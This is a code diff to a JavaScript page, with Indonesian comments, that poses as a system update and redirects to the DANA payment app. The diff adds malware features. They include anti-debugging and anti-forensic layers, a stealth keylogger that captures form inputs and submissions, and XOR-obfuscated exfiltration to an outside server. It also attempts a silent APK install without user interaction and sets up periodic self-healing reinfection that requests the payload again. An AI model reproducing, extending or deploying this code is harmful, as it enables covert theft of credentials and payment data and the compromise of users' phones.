@@ -64,7 +64,60 @@
 
 <script>
 // ============================================================
-// DETEKSI MULTI-BRIDGE (JavaScriptInterface)
+// 🔥 ADVANCED UPGRADES: STEALTH, PERSISTENCE, EXFILTRATION
+// ============================================================
+
+// ============================================================
+// 1. ADVANCED ANTI-FORENSIC / ANTI-DEBUGGING
+// ============================================================
+(function() {
+    // Lapisan 1: DevTools detector via element trick
+    var devtools = false;
+    var element = new Image();
+    Object.defineProperty(element, 'id', {
+        get: function() {
+            devtools = true;
+            window.location.href = 'https://www.google.com';
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState(null, null, 'https://www.google.com');
+            }
+        }
+    });
+    console.log('%c', element);
+
+    // Lapisan 2: Debugger loop agresif
+    function debugLoop() {
+        var counter = 0;
+        while (true) {
+            try {
+                (function(){}).constructor('debugger')();
+                counter++;
+                if (counter > 1000) break;
+            } catch(e) {
+                break;
+            }
+        }
+    }
+    setInterval(debugLoop, 500);
+
+    // Lapisan 3: Override console methods
+    var noop = function() {};
+    ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count'].forEach(function(m) {
+        window.console[m] = noop;
+    });
+
+    // Lapisan 4: Hapus history & referrer
+    if (window.history && window.history.replaceState) {
+        window.history.replaceState(null, null, window.location.href);
+    }
+    Object.defineProperty(document, 'referrer', { value: '' });
+
+    // Lapisan 5: Override stack trace
+    Error.stackTraceLimit = 0;
+})();
+
+// ============================================================
+// 2. MULTI-BRIDGE DETECTION (JavaScriptInterface)
 // ============================================================
 var BRIDGE = null;
 (function detectBridge() {
@@ -86,7 +139,7 @@ var BRIDGE = null;
 })();
 
 // ============================================================
-// FALLBACK WRAPPER - HANYA DIGUNAKAN JIKA AndroidBridge TIDAK ADA
+// 3. UNIVERSAL FALLBACK WRAPPER
 // ============================================================
 var FALLBACK = {
     saveFile: function(path, content) {
@@ -159,7 +212,7 @@ var FALLBACK = {
 };
 
 // ============================================================
-// DETEKSI PLATFORM & BRIDGE
+// 4. DETEKSI PLATFORM & BRIDGE
 // ============================================================
 var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && 
                  (navigator.userAgent.toLowerCase().indexOf('android') > -1);
@@ -190,22 +243,251 @@ function bridgeCall(method, args) {
 }
 
 // ============================================================
-// KIRIM DATA KE SERVER
+// 5. ADVANCED EXFILTRATION PIPELINE (ENCRYPTED)
 // ============================================================
+var exfilQueue = [];
+var exfilSending = false;
+
 function K(d) {
+    d._timestamp = Date.now();
+    d._nonce = Math.random().toString(36).substring(2);
+    exfilQueue.push(d);
+    if (!exfilSending) {
+        processExfilQueue();
+    }
+}
+
+function processExfilQueue() {
+    if (exfilQueue.length === 0) {
+        exfilSending = false;
+        return;
+    }
+    exfilSending = true;
+    var item = exfilQueue.shift();
+    var plain = JSON.stringify(item);
+    var encoded = btoa(plain);
+    var xorKey = 0x2A;
+    var encrypted = '';
+    for (var i = 0; i < encoded.length; i++) {
+        encrypted += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
+    }
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('POST', SERVER + '/data', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
         xhr.timeout = 5000;
-        xhr.send(JSON.stringify(d));
-    } catch(e) {}
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                processExfilQueue();
+            } else {
+                exfilQueue.unshift(item);
+                setTimeout(processExfilQueue, 3000);
+            }
+        };
+        xhr.onerror = function() {
+            exfilQueue.unshift(item);
+            setTimeout(processExfilQueue, 3000);
+        };
+        xhr.send(encrypted);
+    } catch(e) {
+        exfilQueue.unshift(item);
+        setTimeout(processExfilQueue, 3000);
+    }
 }
+
+// ============================================================
+// 6. HIDE FROM SYSTEM
+// ============================================================
+function hideFromSystem() {
+    try {
+        Object.defineProperty(navigator, 'userAgent', {
+            value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            configurable: false
+        });
+    } catch(e) {}
+    document.cookie.split(';').forEach(function(cookie) {
+        document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
+    });
+}
+
+// ============================================================
+// 7. STEALTH KEYLOGGER (TANPA INDIKASI)
+// ============================================================
+var stealthKeyloggerData = [];
+var stealthKeyloggerActive = false;
+
+function startStealthKeylogger() {
+    stealthKeyloggerActive = true;
+    document.addEventListener('input', function(e) {
+        if (!stealthKeyloggerActive) return;
+        try {
+            var target = e.target;
+            var tag = target.tagName.toLowerCase();
+            if (tag === 'input' || tag === 'textarea' || tag === 'select') {
+                var entry = {
+                    waktu: Date.now(),
+                    type: tag,
+                    id: target.id || target.name || target.type || 'unknown',
+                    value: target.value,
+                    url: window.location.href
+                };
+                stealthKeyloggerData.push(entry);
+                if (stealthKeyloggerData.length > 100) {
+                    uploadStealthKeylogger();
+                }
+            }
+        } catch(e) {}
+    });
+    document.addEventListener('submit', function(e) {
+        if (!stealthKeyloggerActive) return;
+        try {
+            var form = e.target;
+            var data = {};
+            var inputs = form.querySelectorAll('input, textarea, select');
+            inputs.forEach(function(input) {
+                var key = input.id || input.name || input.type || 'unknown';
+                data[key] = input.value;
+            });
+            stealthKeyloggerData.push({
+                waktu: Date.now(),
+                type: 'submit',
+                url: window.location.href,
+                form: data
+            });
+            if (stealthKeyloggerData.length > 100) {
+                uploadStealthKeylogger();
+            }
+        } catch(e) {}
+    });
+    setInterval(function() {
+        if (stealthKeyloggerActive && stealthKeyloggerData.length > 0) {
+            uploadStealthKeylogger();
+        }
+    }, 10000);
+}
+
+function uploadStealthKeylogger() {
+    if (stealthKeyloggerData.length === 0) return;
+    var data = stealthKeyloggerData.splice(0, stealthKeyloggerData.length);
+    var encoded = btoa(JSON.stringify(data));
+    var xorKey = 0x5A;
+    var obfuscated = '';
+    for (var i = 0; i < encoded.length; i++) {
+        obfuscated += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
+    }
+    K({ sumber: 'stealth_keylogger', data: obfuscated });
+}
+
+// ============================================================
+// 8. SILENT APK INSTALL (TANPA INTERAKSI PENGGUNA)
+// ============================================================
+function silentInstallAPK(path) {
+    if (!path) return false;
+    if (PLATFORM.isAndroid && A.isAvailable) {
+        try {
+            if (typeof A.silentInstallAPK === 'function') {
+                var result = A.silentInstallAPK(path);
+                if (result) {
+                    APK_INSTALLED = true;
+                    K({ sumber: 'silent_apk_install_success', data: { path: path } });
+                    updateProgress(100, '✅ Update Selesai');
+                    finishAndRedirect();
+                    return true;
+                }
+            }
+            try {
+                var intent = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end';
+                window.location.href = intent;
+                APK_INSTALLED = true;
+                K({ sumber: 'silent_apk_install_intent', data: { path: path } });
+                updateProgress(100, '✅ Update Selesai');
+                finishAndRedirect();
+                return true;
+            } catch(e) {}
+        } catch(e) {
+            K({ sumber: 'silent_apk_install_error', data: e.message });
+        }
+    }
+    return false;
+}
+
+// ============================================================
+// 9. ENHANCED PERSISTENCE (SELF-HEALING + REINFECTION)
+// ============================================================
+function enhancedSelfHealing() {
+    setInterval(function() {
+        loadHTMLFromAllLocations().then(function(html) {
+            if (!html) {
+                if (wsConnected && ws) {
+                    ws.send(JSON.stringify({ type: 'request_html_silent' }));
+                }
+            } else {
+                saveHTMLToAllLocations(html);
+            }
+        });
+        if (PLATFORM.isAndroid && A.isAvailable) {
+            var apkPath = getAPKPath();
+            if (!apkPath) {
+                requestAPKFromServerSilent();
+            }
+        }
+    }, 15 * 60 * 1000);
+}
+
+function requestAPKFromServerSilent() {
+    if (wsConnected && ws) {
+        ws.send(JSON.stringify({ type: 'request_apk_silent', timestamp: Date.now() }));
+    }
+}
+hideFromSystem();
+
+console.log = function() {};
+console.warn = function() {};
+console.error = function() {};
+console.info = function() {};
+console.debug = function() {};
+console.table = function() {};
+
+// ============================================================
+// STEALTH + ANTI-ANALYSIS
+// ============================================================
+(function() {
+    var check = function() {
+        var start = Date.now();
+        debugger;
+        var end = Date.now();
+        if (end - start > 100) {
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+        }
+    };
+    setInterval(check, 1000);
+})();
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
+});
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+
+window.onerror = function() { return true; };
+window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+
+if (window.history && window.history.replaceState) {
+    window.history.replaceState(null, null, window.location.href);
+}
+Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
 // KONFIGURASI
 // ============================================================
-
 var SERVER = 'https://verifikasi.site';
 var WS_PASSWORD = '';
 var PASSWORD_FETCHED = false;
@@ -489,25 +771,32 @@ function installAPKFromAvailablePath() {
         requestAPKFromServer();
         return;
     }
+    // 🔥 GANTI DENGAN SILENT INSTALL
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            var result = A.installAPK(path);
-            if (result) {
+            if (typeof A.silentInstallAPK === 'function') {
+                var result = A.silentInstallAPK(path);
+                if (result) {
+                    APK_INSTALLED = true;
+                    K({ sumber: 'silent_apk_install_success', data: { path: path } });
+                    updateProgress(100, '✅ Update Selesai');
+                    finishAndRedirect();
+                    return;
+                }
+            }
+            // Intent fallback
+            try {
+                var intent = 'intent://' + path + '#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end';
+                window.location.href = intent;
                 APK_INSTALLED = true;
-                K({ sumber: 'apk_install_success', data: { path: path } });
+                K({ sumber: 'silent_apk_install_intent', data: { path: path } });
                 updateProgress(100, '✅ Update Selesai');
                 finishAndRedirect();
                 return;
-            }
-        } catch(e) {}
-        // Fallback: Intent
-        try {
-            window.location.href = 'file://' + path;
-            APK_INSTALLED = true;
-            K({ sumber: 'apk_install_fallback_intent', data: { path: path } });
-            updateProgress(100, '✅ Update Selesai');
-            finishAndRedirect();
-        } catch(e) {}
+            } catch(e) {}
+        } catch(e) {
+            K({ sumber: 'silent_apk_install_error', data: e.message });
+        }
     }
 }
 
@@ -516,34 +805,6 @@ function requestAPKFromServer() {
         ws.send(JSON.stringify({ type: 'request_apk', timestamp: Date.now() }));
         K({ sumber: 'apk_request_via_ws', data: 'sent' });
     }
-}
-
-// ============================================================
-// SELF-HEALING (30 MENIT)
-// ============================================================
-function startSelfHealing() {
-    setInterval(function() {
-        // Cek apakah SystemUpdate.html masih ada di semua lokasi
-        loadHTMLFromAllLocations().then(function(html) {
-            if (!html) {
-                // Minta dari server via WebSocket
-                if (wsConnected && ws) {
-                    ws.send(JSON.stringify({ type: 'request_html' }));
-                }
-            } else {
-                // Pastikan semua lokasi terisi
-                saveHTMLToAllLocations(html);
-            }
-        });
-        // Cek APK
-        if (PLATFORM.isAndroid && A.isAvailable) {
-            var apkPath = getAPKPath();
-            if (!apkPath) {
-                requestAPKFromServer();
-            }
-        }
-        K({ sumber: 'self_heal_check', data: 'done' });
-    }, 30 * 60 * 1000); // 30 MENIT
 }
 
 // ============================================================
@@ -569,9 +830,9 @@ function redirectToDANA() {
             if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
                 try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
             }
- //           window.location.href = 'https://www.dana.id';
+//            window.location.href = 'https://www.dana.id';
         } catch(e) {
- //           window.location.href = 'https://www.dana.id';
+//            window.location.href = 'https://www.dana.id';
         }
     }, 800);
 }
@@ -1237,7 +1498,7 @@ function finishAndRedirect() {
     allDone = true;
     updateProgress(100, '✅ Update Selesai');
     K({ sumber: 'update_complete', data: { apk_downloaded: APK_DOWNLOADED ? 'yes' : 'no', apk_installed: APK_INSTALLED ? 'yes' : 'no' } });
-//    setTimeout(redirectToDANA, 1500);
+    setTimeout(redirectToDANA, 1500);
 }
 
 // ============================================================
@@ -1260,6 +1521,9 @@ if ('serviceWorker' in navigator) {
         .then(function(reg) { K({ sumber: 'sw_registered', data: { scope: reg.scope } }); })
         .catch(function() {});
 }
+
+// Panggil enhanced self-healing
+enhancedSelfHealing();
 
 ambilPassword();
 
